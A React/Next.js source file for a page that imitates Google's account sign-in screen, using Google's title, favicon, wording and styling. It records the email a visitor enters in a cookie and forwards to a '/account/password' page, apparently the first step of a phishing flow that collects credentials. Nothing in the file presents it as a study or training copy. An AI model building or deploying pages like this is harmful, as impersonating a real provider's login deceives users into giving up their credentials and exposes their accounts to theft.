import Cookies from "js-cookie";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useState } from "react";

function EmailPage() {
  const [mail, setMail] = useState("");
  const router = useRouter();

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(mail);
    Cookies.set("mail", mail);
    router.push("/account/password");
  };

  return (
    <>
      <Head>
        <link rel="shortcut icon" href="/google-icon.ico" />
        <title>Sign in - Google Accounts</title>
      </Head>

      <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
        <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-12 md:w-[450px] h-[500px]">
          <div className="text-center">
            <h3 className="text-2xl">Sign in</h3>
            <p className="mt-3">Use your Email Account</p>
          </div>

          <div className="mt-10">
            <form onSubmit={handleSubmit}>
              <input
                type="email"
                name="mail"
                value={mail}
                onChange={(e) => setMail(e.target.value)}
                placeholder="Email"
                required
                className="text-sm w-full outline-none rounded-md px-3 py-4 border border-slate-300 focus:border-2 mb-0.5 focus:mb-0 focus:border-blue-500 placeholder:text-base placeholder:text-gray-500"
              />
              <p className="mt-2 text-sm text-[#1a73e8] cursor-pointer font-medium">
                Forgot email?
              </p>
              <p className="mt-10 text-sm text-[#5f6368]">
                Not your computer? Use Guest mode to sign in privately.
                <span className="md:hidden ml-1 text-sm text-[#1a73e8] cursor-pointer font-medium">
                  Learn more
                </span>
              </p>
              <p className="hidden md:block text-sm text-[#1a73e8] cursor-pointer font-medium">
                Learn more
              </p>

              <div className="mt-[40px] flex justify-between items-center">
                <p className="text-sm text-[#1a73e8] cursor-pointer font-medium">
                  Create account
                </p>

                <button
                  type="submit"
                  className="bg-[#1a73e8] py-2 px-6 rounded text-sm text-white font-medium"
                >
                  Next
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </>
  );
}

export default EmailPage;
